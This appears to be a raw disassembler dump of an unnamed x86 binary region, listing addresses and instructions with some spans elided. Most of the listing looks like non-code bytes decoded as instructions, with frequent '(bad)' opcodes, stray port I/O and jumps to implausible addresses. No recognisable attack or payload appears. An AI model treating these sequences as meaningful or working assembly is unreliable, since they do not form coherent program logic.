  41d70b:	imul   esp,DWORD PTR [ebx],0x42
  41d70e:	dec    ebp
  41d70f:	add    BYTE PTR [esi],bh
  41d711:	inc    edx
  41d712:	add    DWORD PTR [eax],eax
  41d714:	ds inc edx
  41d716:	add    DWORD PTR [eax],eax
  41d718:	push   eax
  41d719:	pop    edi
  41d71a:	sub    al,0x63
  41d71c:	ds xchg ecx,eax
  41d71e:	and    DWORD PTR [esi-0x16],esp
  41d721:	ins    BYTE PTR es:[edi],dx
  41d722:	and    esi,DWORD PTR [edx-0x1d]
  41d725:	jge    0x41d780
  41d727:	shr    BYTE PTR [bx+0x43],1
  41d72b:	push   edx
  41d72c:	ds pop ebp
  41d72e:	xor    al,0x63
  41d730:	loopne 0x41d773
  41d732:	add    al,0x0
  41d734:	ds ret 0x631e
  41d738:	int3   
  41d739:	and    ebp,DWORD PTR [eax]
  41d73b:	ins    BYTE PTR es:[edi],dx
  41d73c:	ins    DWORD PTR es:[edi],dx
  41d73d:	jbe    0x41d721
  41d73f:	arpl   WORD PTR [edx-0x6daafef0],sp
  41d745:	cmc    
  41d746:	dec    ecx
  41d747:	arpl   WORD PTR [edx-0x588bd9fd],bp
  41d74d:	adc    ch,BYTE PTR [eax]
  41d74f:	inc    ecx
  41d750:	mov    eax,ds:0x9a6d3612
  41d755:	pop    ebx
  41d756:	mov    WORD PTR [esi+0x0],ss
	...
  41d781:	add    BYTE PTR [ebp+0x6b1c9ace],bl
  41d787:	shl    DWORD PTR [eax-0x6654c1d9],0x22
  41d78e:	pop    edi
  41d78f:	mov    eax,0xb779367a
  41d794:	xchg   ebx,eax
  41d795:	and    ch,BYTE PTR [edi-0x48]
  41d798:	jp     0x41d7d0
  41d79a:	pop    ecx
  41d79b:	ret    0x3c7d
  41d79e:	bound  ebx,QWORD PTR [ebx-0x19]
  41d7a1:	and    DWORD PTR [ebp-0x39],ebx
  41d7a4:	dec    eax
  41d7a5:	xor    al,0x21
  41d7a7:	mov    ds,WORD PTR [ecx]
  41d7a9:	loop   0x41d7c8
  41d7ab:	mov    edi,0xb7f8043b
  41d7b0:	cmp    eax,DWORD PTR [ebx+0x2e]
  41d7b3:	les    ebp,FWORD PTR [ecx]
  41d7b5:	aaa    
  41d7b6:	and    BYTE PTR [ecx-0x3307c9b4],bh
  41d7bc:	inc    esp
  41d7bd:	daa    
  41d7be:	mov    eax,ds:0xcded380c
  41d7c4:	add    al,0x36
  41d7c6:	std    
  41d7c7:	rcr    BYTE PTR [edi+ebx*1],0x3e
  41d7cb:	pop    ebx
  41d7cc:	(bad)  
  41d7cd:	pop    ds
  41d7ce:	fisttp QWORD PTR [ebp-0x41221e47]
  41d7d4:	or     eax,DWORD PTR [edi+ebp*8]
  41d7d7:	(bad)  
  41d7d8:	push   cs
  41d7d9:	inc    ecx
  41d7da:	into   
  41d7db:	mov    bh,0xfd
  41d7dd:	push   esp
  41d7de:	rol    cl,cl
  41d7e0:	fldenv [edx]
  41d7e2:	(bad)  [edi+0x3e7]
	...
  41d810:	cdq    
  41d811:	mov    bh,0xdd
  41d813:	and    ch,BYTE PTR [esi+0x5bf61ac4]
  41d819:	mov    bh,0xd3
  41d81b:	pop    ds
  41d81c:	ds pushf 
  41d81e:	retf   
  41d81f:	pop    ds
  41d820:	stos   DWORD PTR es:[edi],eax
  41d821:	mov    esi,0xbe49c800
  41d826:	aas    
  41d827:	mov    edi,0x906e9a61
  41d82c:	dec    ecx
  41d82d:	mov    edx,0xd5548d5f
  41d832:	arpl   WORD PTR [edx-0x55ff48ac],di
  41d838:	inc    ebp
  41d839:	mov    esi,0xc0899261
  41d83e:	imul   eax,DWORD PTR [edi+ebx*1+0x1b8463a6],0x257a72be
  41d849:	mov    edx,0xcd77e970
  41d84e:	arpl   WORD PTR [ebx+edx*1-0x46],ax
  41d852:	fs jmp 0x45a5a552
  41d858:	add    ecx,eax
  41d85a:	jae    0x41d8b0
  41d85c:	pop    ecx
  41d85d:	int    0x5f
  41d85f:	xor    eax,0x2a009261
  41d864:	dec    eax
  41d865:	mov    esi,0xbe502764
  41d86a:	arpl   cx,bp
  41d86c:	cli    
  41d86d:	int3   
  41d86e:	ja     0x41d889
  41d870:	ss cwde 
  41d872:	arpl   WORD PTR ds:0x0,bx
	...
  41d89c:	add    BYTE PTR [eax],al
  41d89e:	or     esp,ecx
  41d8a0:	arpl   WORD PTR [ebx],bx
  41d8a2:	sub    edi,DWORD PTR [esi-0x33051689]
  41d8a8:	ja     0x41d8a3
  41d8aa:	adc    DWORD PTR [esi-0x32e10688],ebx
  41d8b0:	je     0x41d8d4
  41d8b2:	and    edx,ecx
  41d8b4:	add    BYTE PTR [edx-0x2a8f35f5],ch
  41d8ba:	cmp    DWORD PTR [ecx+esi*2+0x77be6bdd],0xc860a2
  41d8c5:	add    ah,dl
  41d8c7:	xchg   BYTE PTR [ebp+0x70],dh
  41d8ca:	shl    DWORD PTR [esi+0x7e026c61],cl
  41d8d0:	outs   dx,DWORD PTR ds:[esi]
  41d8d1:	gs aam 0x7b
  41d8d4:	outs   dx,BYTE PTR ds:[esi]
  41d8d5:	je     0x41d889
  41d8d7:	test   BYTE PTR [eax+eax*1-0x4b],dh
  41d8db:	jns    0x41d953
  41d8dd:	gs aad 0x88
  41d8e0:	push   esp
  41d8e1:	outs   dx,DWORD PTR ds:[esi]
  41d8e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d8e3:	jns    0x41d951
  41d8e5:	data16 xlat BYTE PTR ds:[ebx]
  41d8e7:	fwait
  41d8e8:	jo     0x41d94f
  41d8ea:	leave  
  41d8eb:	lods   al,BYTE PTR ds:[esi]
  41d8ec:	jb     0x41d95d
  41d8ee:	les    edi,FWORD PTR [ecx+0x6f]
  41d8f1:	jae    0x41d8a6
  41d8f3:	jnp    0x41d95c
  41d8f5:	imul   edx,DWORD PTR gs:[edi+0x45],0x7282176d
  41d8fd:	jae    0x41d8f7
  41d8ff:	jo     0x41d95e
  41d901:	je     0x41d903
	...
  41d92b:	add    BYTE PTR [edx],al
  41d92d:	fwait
  41d92e:	imul   esp,DWORD PTR [edi-0x10],0xffffff81
  41d932:	fs dec edi
  41d934:	or     DWORD PTR [edx+0x5755656f],esi
  41d93a:	inc    ebx
  41d93b:	gs push ebx
  41d93d:	mov    bl,0x6b
  41d93f:	imul   esi,DWORD PTR [edx],0x71
  41d942:	inc    ebp
  41d943:	outs   dx,BYTE PTR ds:[esi]
  41d944:	inc    ecx
  41d945:	jo     0x41d9b9
  41d947:	ins    DWORD PTR es:[edi],dx
  41d948:	inc    esi
  41d949:	xchg   ebx,eax
  41d94a:	outs   dx,DWORD PTR gs:[esi]
  41d94c:	imul   ebx,DWORD PTR [edi+edi*1+0x6f],0x72618949
  41d954:	push   ebx
  41d955:	lods   eax,DWORD PTR ds:[esi]
  41d956:	gs xor esi,DWORD PTR fs:[eax+0x4f]
  41d95b:	je     0x41d9a2
  41d95d:	outs   dx,DWORD PTR ds:[esi]
  41d95e:	outs   dx,BYTE PTR ds:[esi]
  41d95f:	test   BYTE PTR [bx+0x64],ch
  41d963:	inc    ecx
  41d964:	daa    
  41d965:	nop
  41d966:	imul   esp,DWORD PTR [edi+0x3e],0x19
  41d96a:	sbb    edx,DWORD PTR [ebx-0x53]
  41d96d:	pop    ss
  41d96e:	das    
  41d96f:	aas    
  41d970:	ds push es
  41d972:	push   ds
  41d973:	ins    DWORD PTR es:[edi],dx
  41d974:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d975:	pop    es
  41d976:	xor    DWORD PTR [eax-0x74],edx
  41d979:	sbb    esi,DWORD PTR [ebx]
  41d97b:	addr16 call 0x1ce3:0x68632617
  41d983:	jae    0x41d9e8
  41d985:	add    eax,DWORD PTR [ecx]
  41d987:	aas    
  41d988:	pop    edx
  41d989:	fdiv   QWORD PTR [edi]
  41d98b:	jno    0x41d9ff
  41d98d:	push   es
  41d98e:	push   ds
  41d98f:	imul   eax,DWORD PTR [eax],0x0
	...
  41d9b9:	add    BYTE PTR [ebx-0x18],bl
  41d9bc:	push   eax
  41d9bd:	jb     0x41da26
  41d9bf:	enter  0x6c1c,0x5b
  41d9c3:	loope  0x41d9ec
  41d9c5:	jno    0x41da05
  41d9c7:	inc    edx
  41d9c8:	and    dh,BYTE PTR [edx+0x47]
  41d9cb:	mov    dl,0x38
  41d9cd:	xor    DWORD PTR [eax+eiz*2+0x28],ebp
  41d9d1:	ins    BYTE PTR es:[edi],dx
  41d9d2:	and    al,BYTE PTR [edx+0x42]
  41d9d5:	jb     0x41d9fe
  41d9d7:	mov    dl,0x38
  41d9d9:	push   ebx
  41d9da:	adc    BYTE PTR [edx-0x68ed92ce],dl
  41d9e0:	and    DWORD PTR [edx+edi*8-0x5e],esi
  41d9e4:	cmp    BYTE PTR [edi+0x3e],bl
  41d9e7:	test   DWORD PTR [edi],esp
  41d9e9:	jb     0x41d9f5
  41d9eb:	mov    DWORD PTR [ebx+eiz*2],esi
  41d9ee:	call   0xeab30587
  41d9f3:	pop    esi
  41d9f4:	pop    ds
  41d9f5:	push   ecx
  41d9f6:	repnz push eax
  41d9f8:	das    
  41d9f9:	arpl   di,di
  41d9fb:	inc    ecx
  41d9fc:	inc    edx
  41d9fd:	arpl   sp,cx
  41d9ff:	inc    ebp
  41da00:	dec    eax
  41da01:	outs   dx,BYTE PTR ds:[esi]
  41da02:	retf   
  41da03:	push   esi
  41da04:	inc    ecx
  41da05:	arpl   sp,cx
  41da07:	inc    ebp
  41da08:	sbb    al,0x66
  41da0a:	xlat   BYTE PTR ds:[ebx]
  41da0b:	pop    edx
  41da0c:	retf   0xb224
  41da0f:	mov    eax,0xaaa03cda
  41da14:	fistp  DWORD PTR [esi]
  41da16:	lods   al,BYTE PTR ds:[esi]
  41da17:	mov    eax,0xc99d42e7
  41da1c:	mov    ebx,0x42
	...
  41da45:	add    BYTE PTR [eax],al
  41da47:	add    BYTE PTR [edx+0x6f28babe],ch
  41da4d:	mov    esi,0xaa5b9d31
  41da53:	xor    DWORD PTR [ecx+0x5f449bcb],ecx
  41da59:	int3   
  41da5a:	xchg   esp,eax
  41da5b:	sbb    al,0x6c
  41da5d:	mov    eax,0xc76c28aa
  41da62:	and    BYTE PTR ds:0x3788ba59,0x5d
  41da69:	stos   DWORD PTR es:[edi],eax
  41da6a:	jns    0x41da88
  41da6c:	dec    eax
  41da6d:	mov    esp,0xb877287b
  41da72:	jo     0x41da77
  41da74:	rcr    BYTE PTR ds:[edx+0x1b],0x68
  41da79:	mov    bh,0x4b
  41da7b:	and    BYTE PTR [esi],bh
  41da7d:	mov    al,ds:0xb8031b5a
  41da82:	push   ebx
  41da83:	inc    ecx
  41da84:	adc    eax,eax
  41da86:	aaa    
  41da87:	sbb    eax,0x384db828
  41da8c:	out    dx,al
  41da8d:	mov    ebx,0x5b491c3b
  41da92:	out    0x33,eax
  41da94:	(bad)  
  41da96:	push   ss
  41da97:	xor    bl,ch
  41da99:	mov    ecx,0xbee227cd
  41da9e:	out    0x53,eax
  41daa0:	rdseed esi
  41daa3:	xor    ebp,ebx
  41daa5:	cdq    
  41daa6:	stc    
  41daa7:	es stc 
  41daa9:	mov    BYTE PTR [ebx+edi*1],0x0
	...
  41dad5:	add    al,ah
  41dad7:	leave  
  41dad8:	add    ch,bh
  41dada:	sbb    al,0xbd
  41dadc:	popa   
  41dadd:	add    al,0x3a
  41dadf:	pop    ebx
  41dae0:	add    cl,ch
  41dae2:	cmp    eax,0x3de9005b
  41dae7:	pop    ebx
  41dae8:	add    cl,ch
  41daea:	cmp    eax,0x3de9005b
  41daef:	pop    ebx
  41daf0:	add    cl,ch
  41daf2:	cmp    eax,0x3de9005b
  41daf7:	pop    ebx
  41daf8:	add    cl,ch
  41dafa:	cmp    eax,0x3de9005b
  41daff:	pop    ebx
  41db00:	add    cl,ch
  41db02:	cmp    eax,0x3de9005b
  41db07:	pop    ebx
  41db08:	add    cl,ch
  41db0a:	cmp    eax,0x3de9005b
  41db0f:	pop    ebx
  41db10:	add    cl,ch
  41db12:	cmp    eax,0x3de9005b
  41db17:	pop    ebx
  41db18:	add    cl,ch
  41db1a:	cmp    eax,0x3de9005b
  41db1f:	pop    ebx
  41db20:	add    cl,ch
  41db22:	cmp    eax,0x3de9005b
  41db27:	pop    ebx
  41db28:	add    cl,ch
  41db2a:	cmp    eax,0x3de9005b
  41db2f:	pop    ebx
  41db30:	add    cl,ch
  41db32:	cmp    eax,0x3de9005b
  41db37:	pop    ebx
  41db38:	add    cl,ch
	...
  41db62:	add    BYTE PTR [eax],al
  41db64:	cmp    eax,0x3de9005b
  41db69:	pop    ebx
  41db6a:	add    cl,ch
  41db6c:	cmp    eax,0x3de9005b
  41db71:	pop    ebx
  41db72:	add    cl,ch
  41db74:	cmp    eax,0x3de9005b
  41db79:	pop    ebx
  41db7a:	add    BYTE PTR [eax],al
  41db7c:	addr16 pop ecx
  41db7e:	add    BYTE PTR [ebx+0x2f],dh
  41db81:	jbe    0x41dbef
  41db83:	ins    BYTE PTR es:[edi],dx
  41db84:	test   BYTE PTR [ebx+0x2b],cl
  41db87:	fs inc ebx
  41db89:	ins    DWORD PTR es:[edi],dx
  41db8a:	add    BYTE PTR [ebx-0x11],dl
  41db8d:	xchg   edi,eax
  41db8e:	popa   
  41db8f:	je     0x41db6a
  41db91:	outs   dx,DWORD PTR ds:[esi]
  41db92:	ins    BYTE PTR es:[edi],dx
  41db93:	fs cli 
  41db95:	mov    dl,BYTE PTR [eax+0x61]
  41db98:	or     esi,DWORD PTR [ecx+0x3d]
  41db9b:	add    BYTE PTR [edi],ah
  41db9d:	pop    ecx
  41db9e:	add    BYTE PTR [eax],al
  41dba0:	daa    
  41dba1:	ss dec ecx
  41dba3:	inc    ecx
  41dba4:	pop    ss
  41dba5:	inc    ebx
  41dba6:	dec    ecx
  41dba7:	inc    ecx
  41dba8:	pop    ss
  41dba9:	xchg   ebx,eax
  41dbaa:	dec    esp
  41dbab:	inc    ecx
  41dbac:	out    0x78,eax
  41dbae:	dec    esp
  41dbaf:	inc    ecx
  41dbb0:	out    0x6e,eax
  41dbb2:	dec    esp
  41dbb3:	inc    ecx
  41dbb4:	xlat   BYTE PTR ds:[ebx]
  41dbb5:	jle    0x41dc03
  41dbb7:	inc    ecx
  41dbb8:	xlat   BYTE PTR ds:[ebx]
  41dbb9:	into   
  41dbba:	dec    esp
  41dbbb:	inc    ecx
  41dbbc:	out    0xbb,eax
  41dbbe:	dec    esp
  41dbbf:	inc    ecx
  41dbc0:	out    0xc2,eax
  41dbc2:	dec    esp
  41dbc3:	inc    ecx
  41dbc4:	xlat   BYTE PTR ds:[ebx]
  41dbc5:	push   cs
  41dbc6:	dec    esp
  41dbc7:	inc    ecx
	...
  41dbf0:	add    BYTE PTR [eax],al
  41dbf2:	xlat   BYTE PTR ds:[ebx]
  41dbf3:	test   DWORD PTR [ebx+0x41],0x414a4da7
  41dbfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dbfb:	xor    BYTE PTR [edx+0x41],cl
  41dbfe:	xchg   edi,eax
  41dbff:	pop    eax
  41dc00:	add    BYTE PTR [eax],al
  41dc02:	xchg   edi,eax
  41dc03:	push   edi
  41dc04:	add    BYTE PTR [eax],al
  41dc06:	daa    
  41dc07:	pop    edx
  41dc08:	add    BYTE PTR [eax],al
  41dc0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc0b:	xchg   ebx,eax
  41dc0c:	jne    0x41dc2e
  41dc0e:	pop    ebx
  41dc0f:	jo     0x41dc70
  41dc11:	jne    0x41dc55
  41dc13:	jp     0x41dc83
  41dc15:	je     0x41dc6b
  41dc17:	push   edi
  41dc18:	std    
  41dc19:	jmp    DWORD PTR [edi-0x28]
  41dc1c:	sbb    DWORD PTR [eax],eax
  41dc1e:	ds inc edx
  41dc20:	add    DWORD PTR [edi],edi
  41dc22:	out    dx,al
  41dc23:	jno    0x41dc65
  41dc25:	pop    edi
  41dc26:	shl    BYTE PTR [edx+0x4],cl
  41dc29:	call   DWORD PTR [ecx+0x42]
  41dc2c:	sbb    DWORD PTR [esi+edi*1],0xd14c0142
  41dc33:	pusha  
  41dc34:	and    ebp,DWORD PTR [esi+ebx*2+0x3]
  41dc38:	xor    DWORD PTR [eax+0x7a],esi
  41dc3b:	and    ebp,DWORD PTR ds:0x1433e5f
  41dc41:	add    BYTE PTR [esi+0x3e000461],bh
  41dc47:	add    DWORD PTR [ecx+eiz*2],esp
  41dc4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc4b:	pop    ss
  41dc4c:	add    edi,edi
  41dc4e:	or     DWORD PTR [edx-0x7f],eax
  41dc51:	pop    ds
  41dc52:	ds inc edx
  41dc54:	add    DWORD PTR [ecx+0x0],eax
	...
  41dc7f:	add    BYTE PTR [ecx-0x1b],ch
  41dc82:	sbb    eax,0xf15b67
  41dc87:	(bad)  
  41dc88:	jmp    0x3e645dce
  41dc8d:	inc    edx
  41dc8e:	add    DWORD PTR [eax+0x67],ecx
  41dc91:	shr    DWORD PTR ds:0xdb4c6d,1
  41dc97:	add    bh,BYTE PTR [esi]
  41dc99:	inc    edx
  41dc9a:	add    DWORD PTR [ebx],0x4b01423e
  41dca0:	aaa    
  41dca1:	bound  eax,QWORD PTR [eax+0x6d]
  41dca4:	sbb    eax,0x186317a7
  41dca9:	scas   al,BYTE PTR es:[edi]
  41dcaa:	xor    eax,0x1423c00
  41dcaf:	sbb    BYTE PTR [ebp+0x42],0x1
  41dcb3:	add    ch,bh
  41dcb5:	pushf  
  41dcb6:	pop    ss
  41dcb7:	imul   ebx,DWORD PTR [ecx],0xffffff94
  41dcba:	in     al,0x3e
  41dcbc:	push   cs
  41dcbd:	xchg   edx,eax
  41dcbe:	inc    eax
  41dcbf:	pop    edi
  41dcc0:	repnz pop edx
  41dcc2:	or     BYTE PTR [ecx+esi*2],al
  41dcc5:	dec    ebx
  41dcc6:	out    0x83,eax
  41dcc8:	and    ebx,DWORD PTR [ebx-0x19]
  41dccb:	add    esi,ebp
  41dccd:	rol    edi,1
  41dccf:	push   ebx
  41dcd0:	loope  0x41dc89
  41dcd2:	sti    
  41dcd3:	xor    ah,cl
  41dcd5:	mov    ch,0xfa
  41dcd7:	add    edi,DWORD PTR [ebx+ebx*2]
  41dcda:	out    0x83,eax
  41dcdc:	adc    BYTE PTR [ebx-0x19],bl
  41dcdf:	add    edi,DWORD PTR [edi-0x46]
  41dce2:	aam    0x18
	...
  41dd0c:	add    BYTE PTR [eax],al
  41dd0e:	mov    ds:0x9b4007b9,eax
  41dd13:	mov    esi,0xb99d18dc
  41dd18:	shl    DWORD PTR [esi],cl
  41dd1a:	ds pop ebp
  41dd1c:	out    0x3,eax
  41dd1e:	mov    esi,0x3e03e77a
  41dd23:	sahf   
  41dd24:	(bad)  
  41dd25:	sbb    BYTE PTR [ebp+0x38e3bdba],dl
  41dd2b:	mov    edi,0xb4601c94
  41dd30:	call   0x681c:0x9bbc6c2f
  41dd37:	rol    bh,0x4f
  41dd3a:	imul   edi,DWORD PTR [edx+0x5c3e3693],0xffffffe7
  41dd41:	add    edi,DWORD PTR [esi+0x3e03e78b]
  41dd47:	pushf  
  41dd48:	sbb    DWORD PTR [eax],0x21
  41dd4b:	mov    ecx,0xcd2a3550
  41dd50:	dec    eax
  41dd51:	xor    BYTE PTR [ecx],ah
  41dd53:	ror    DWORD PTR [esp+eiz*8+0xd],1
  41dd57:	mov    edx,0x5b0f183e
  41dd5c:	call   0xe41d1b64
  41dd61:	add    edi,DWORD PTR [esi]
  41dd63:	pop    ebx
  41dd64:	add    BYTE PTR [ecx],bl
  41dd66:	and    ebp,ecx
  41dd68:	jno    0x41dda8
  41dd6a:	push   esp
  41dd6b:	stos   BYTE PTR es:[edi],al
  41dd6c:	ins    BYTE PTR es:[edi],dx
  41dd6d:	jmp    0x15a8957c
	...
  41dd9a:	add    BYTE PTR [eax],al
  41dd9c:	das    
  41dd9d:	stos   BYTE PTR es:[edi],al
  41dd9e:	jb     0x41ddac
  41dda0:	not    BYTE PTR [ebp-0x47eff599]
  41dda6:	jno    0x41ddbe
  41dda8:	sbb    al,0xcf
  41ddaa:	pop    esp
  41ddab:	push   ss
  41ddac:	and    eax,0xf0664b9
  41ddb1:	int3   
  41ddb2:	pop    esp
  41ddb3:	sub    ch,BYTE PTR [ecx-0x33]
  41ddb6:	jb     0x41dd84
  41ddb8:	push   edi
  41ddb9:	iret   
  41ddba:	push   esi
  41ddbb:	les    esi,FWORD PTR [ebx-0x34]
  41ddbe:	mov    BYTE PTR [bx-0x59],0x43
  41ddc3:	ror    DWORD PTR [ebp-0x49],1
  41ddc6:	ins    DWORD PTR es:[edi],dx
  41ddc7:	mov    ebx,0x9a5ccd30
  41ddcc:	and    eax,0x1dc56cbe
  41ddd1:	mov    al,ds:0xbe59bd6d
  41ddd6:	jb     0x41dd72
  41ddd8:	cmp    eax,0x519978be
  41dddd:	mov    eax,0x792b8c72
  41dde2:	arpl   WORD PTR [ecx-0x2baea4c8],dx
  41dde8:	int3   
  41dde9:	je     0x41de1e
  41ddeb:	int3   
  41ddec:	int3   
  41dded:	xchg   ecx,eax
  41ddee:	add    cl,ch
  41ddf0:	cmp    eax,0x589a005b
  41ddf5:	mov    ds:0xcd51596b,al
  41ddfa:	jno    0x41de4a
  41ddfc:	inc    esp
  41ddfd:	stos   BYTE PTR es:[edi],al
  41ddfe:	je     0x41de4c
	...
  41de28:	add    BYTE PTR [eax],al
  41de2a:	or     cl,ch
  41de2c:	addr16 push edi
  41de2e:	xor    eax,0x63b7
  41de33:	push   0x0
  41de35:	push   ebx
  41de36:	add    ch,BYTE PTR [ebx-0x6ed89da1]
  41de3c:	gs jbe 0x41de3d
  41de3f:	bound  esp,QWORD PTR [ecx+0x67]
  41de42:	inc    edx
  41de43:	pop    edi
  41de44:	dec    edi
  41de45:	gs adc al,0x67
  41de48:	pop    ebp
  41de49:	outs   dx,BYTE PTR ds:[esi]
  41de4a:	xor    BYTE PTR [edx+0x4e],ch
  41de4d:	outs   dx,DWORD PTR ds:[esi]
  41de4e:	xor    esp,DWORD PTR [esi+0x66]
  41de51:	jns    0x41de8a
  41de53:	xchg   ecx,eax
  41de54:	gs jbe 0x41de85
  41de57:	arpl   WORD PTR [ecx+0x67],sp
  41de5a:	xor    bl,BYTE PTR [edi+0x4f]
  41de5d:	gs fs xchg ecx,eax
  41de60:	popa   
  41de61:	popa   
  41de62:	adc    ebp,DWORD PTR [edx+0x54]
  41de65:	outs   dx,DWORD PTR ds:[esi]
  41de66:	or     al,0x6a
  41de68:	outs   dx,BYTE PTR ds:[esi]
  41de69:	push   eax
  41de6a:	add    eax,0xdb697666
  41de6f:	imul   esp,DWORD PTR [ebx+0x65],0x4261b027
  41de76:	idiv   BYTE PTR [edi+0x67]
  41de79:	jne    0x41de42
  41de7b:	lods   al,BYTE PTR ds:[esi]
  41de7c:	jb     0x41dee7
  41de7e:	mov    cl,0x65
  41de80:	ins    BYTE PTR es:[edi],dx
  41de81:	shr    BYTE PTR gs:[ecx+0x0],0x53
  41de86:	ret    0x61ae
  41de89:	jae    0x41de4e
  41de8b:	arpl   WORD PTR [edx+0x65],si
	...
  41deb6:	add    BYTE PTR [eax],al
  41deb8:	xchg   edi,eax
  41deb9:	mov    fs,WORD PTR [ebp+0x76]
  41debc:	scas   al,BYTE PTR es:[edi]
  41debd:	jo     0x41df20
  41debf:	addr16 ret 0x4f5c
  41dec3:	gs sahf 
  41dec5:	bound  ebx,QWORD PTR [edi+0x72]
  41dec8:	ret    0x6f7d
  41decb:	gs jbe 0x41de58
  41dece:	imul   esi,DWORD PTR [esi+esi*8-0x52],0x72
  41ded3:	imul   edi,DWORD PTR [esi],0x236c1ba8
  41ded9:	mov    eax,ds:0x96ed001f
  41dede:	inc    ebx
  41dedf:	jno    0x41deee
  41dee1:	stos   DWORD PTR es:[edi],eax
  41dee2:	sbb    eax,0x1b83ee6e
  41dee7:	imul   ebx,edi,0xffffff83
  41deea:	sub    edx,DWORD PTR [ecx+eiz*8+0x6c]
  41deee:	pop    ds
  41deef:	outs   dx,BYTE PTR ds:[esi]
  41def0:	push   cs
  41def1:	sbb    esi,DWORD PTR fs:[esi-0x29]
  41def5:	pop    ebp
  41def6:	pop    ds
  41def7:	gs jecxz 0x41df2b
  41defa:	add    DWORD PTR [eax+0x1],edx
  41defd:	gs push eax
  41deff:	and    BYTE PTR [ebx],ah
  41df01:	inc    ebp
  41df02:	loope  0x41df4b
  41df04:	jmp    0xf108:0x6f2d5465
  41df0b:	or     al,BYTE PTR [edx+ecx*1+0x16]
  41df0f:	jno    0x41dec3
  41df11:	jl     0x41def7
  41df13:	and    ch,BYTE PTR [ebp-0x62c108c1]
  41df19:	adc    eax,0x7020
	...
  41df46:	mov    bl,BYTE PTR [esp+eiz*8+0x29]
  41df4a:	pop    ecx
  41df4b:	ins    BYTE PTR es:[edi],dx
  41df4c:	test   DWORD PTR [ecx],0x6322157f
  41df52:	outs   dx,BYTE PTR ds:[esi]
  41df53:	push   cs
  41df54:	fadd   DWORD PTR [edx+0x60]
  41df57:	aad    0x15
  41df59:	fs push edi
  41df5b:	fcomp  DWORD PTR ds:0x1cdb1e3a
  41df61:	arpl   WORD PTR [eax-0x12],bp
  41df64:	sbb    esi,DWORD PTR [edi+edx*2+0x2e]
  41df68:	loope  0x41df93
  41df6a:	add    eax,0x332fe8c3
  41df6f:	cmp    al,0x42
  41df71:	ins    DWORD PTR es:[edi],dx
  41df72:	sub    dh,cl
  41df74:	and    BYTE PTR [esi+0x2a],ch
  41df77:	pop    ebx
  41df78:	adc    al,0x38
  41df7a:	sbb    eax,0x163046b9
  41df7f:	test   DWORD PTR [edi],eax
  41df81:	loope  0x41dfa8
  41df83:	into   
  41df84:	fdiv   st(1),st
  41df86:	(bad)  
  41df87:	mov    bh,0x55
  41df89:	push   ss
  41df8a:	sbb    eax,0x131d33bc
  41df8f:	mov    ecx,0xb6dee3f1
  41df94:	ds xor ebx,ebp
  41df97:	push   ebp
  41df98:	icebp  
  41df99:	inc    edx
  41df9a:	fstp   TBYTE PTR [eax-0x312fdeed]
  41dfa0:	les    ecx,FWORD PTR [edi-0x2f]
  41dfa3:	retf   0xea04
  41dfa6:	xor    DWORD PTR [edx+0x33f7],edi
	...
  41dfd4:	fidiv  DWORD PTR [ecx-0x4e35daf6]
  41dfda:	push   es
  41dfdb:	push   ss
  41dfdc:	imul   esi,DWORD PTR [esi-0x3062cff6],0x14
  41dfe3:	xor    esi,DWORD PTR [edx-0x6adb3b37]
  41dfe9:	pop    eax
  41dfea:	loope  0x41e02e
  41dfec:	stos   DWORD PTR es:[edi],eax
  41dfed:	mov    ch,0xd3
  41dfef:	and    BYTE PTR [eax-0x67beeb31],ah
  41dff5:	mov    edx,0xb5991fce
  41dffa:	into   
  41dffb:	jmp    0x16029959
  41e000:	xchg   ecx,eax
  41e001:	leave  
  41e002:	mov    al,ds:0x9ab037f8
  41e007:	and    BYTE PTR [eax+edi*2-0x58],ch
  41e00b:	push   ds
  41e00c:	pop    ebp
  41e00d:	mov    ch,0x93
  41e00f:	jmp    0x29d87845
  41e014:	popa   
  41e015:	mov    bh,0x8b
  41e017:	and    al,0x13
  41e019:	pop    DWORD PTR [eax]
  41e01b:	(bad)  
  41e01c:	lods   eax,DWORD PTR ds:[esi]
  41e01d:	data16 sub BYTE PTR [edx+0x4870b248],cl
  41e024:	outs   dx,BYTE PTR ds:[esi]
  41e025:	mov    esi,0x84414d62
  41e02a:	and    BYTE PTR [edi+ebp*8],ah
  41e02d:	popf   
  41e02e:	inc    ebx
  41e02f:	or     DWORD PTR [ecx-0x5dfdcf88],esp
  41e035:	scas   eax,DWORD PTR es:[edi]
  41e036:	addr16 dec edi
	...
  41e060:	add    BYTE PTR [eax],al
  41e062:	pop    esi
  41e063:	mov    eax,0x8d623a75
  41e068:	cmp    BYTE PTR [eax],al
  41e06a:	imul   edx,DWORD PTR [ebx+ecx*1-0xd],0xf6d9c3d
  41e072:	cs mov edx,0x92711d6e
  41e078:	arpl   di,di
  41e07a:	xor    cl,bh
  41e07c:	push   0x6d973dc3
  41e081:	or     bl,BYTE PTR ds:0x500667cf
  41e087:	add    DWORD PTR [eax],0x20af7126
  41e08d:	or     al,0x6f
  41e08f:	jnp    0x41e0d9
  41e091:	mov    ch,0x71
  41e093:	stos   DWORD PTR es:[edi],eax
  41e094:	sub    eax,0xb75f018
  41e099:	jecxz  0x41e0f0
  41e09b:	mov    eax,0x6617bd71
  41e0a0:	and    edi,DWORD PTR [edx-0x35c0abf8]
  41e0a6:	push   ds
  41e0a7:	mov    edx,0x65e7b570
  41e0ac:	sub    dl,dh
  41e0ae:	pop    es
  41e0af:	push   ecx
  41e0b0:	or     ch,BYTE PTR [eax-0x669c43e2]
  41e0b6:	sub    DWORD PTR [edx+0x43],esi
  41e0b9:	jg     0x41e0d9
  41e0bb:	mov    eax,0x6fae0064
  41e0c0:	arpl   WORD PTR [edx],di
  41e0c2:	mul    DWORD PTR [eax+0x64]
  41e0c5:	add    BYTE PTR gs:[eax],al
	...
  41e0f0:	shl    DWORD PTR [ebp+0x65],0x74
  41e0f4:	cs cs sbb eax,0x398a5c2a
  41e0fb:	xor    BYTE PTR [edx+0x16f4043],dl
  41e101:	ins    DWORD PTR es:[edi],dx
  41e102:	popa   
  41e103:	arpl   bx,bp
  41e105:	popa   
  41e106:	imul   ebp,DWORD PTR [esi+0x3d],0x3f
  41e10a:	pusha  
  41e10b:	ins    BYTE PTR es:[edi],dx
  41e10c:	lock mov esp,DWORD PTR [ecx+0xd]
  41e110:	pop    ebp
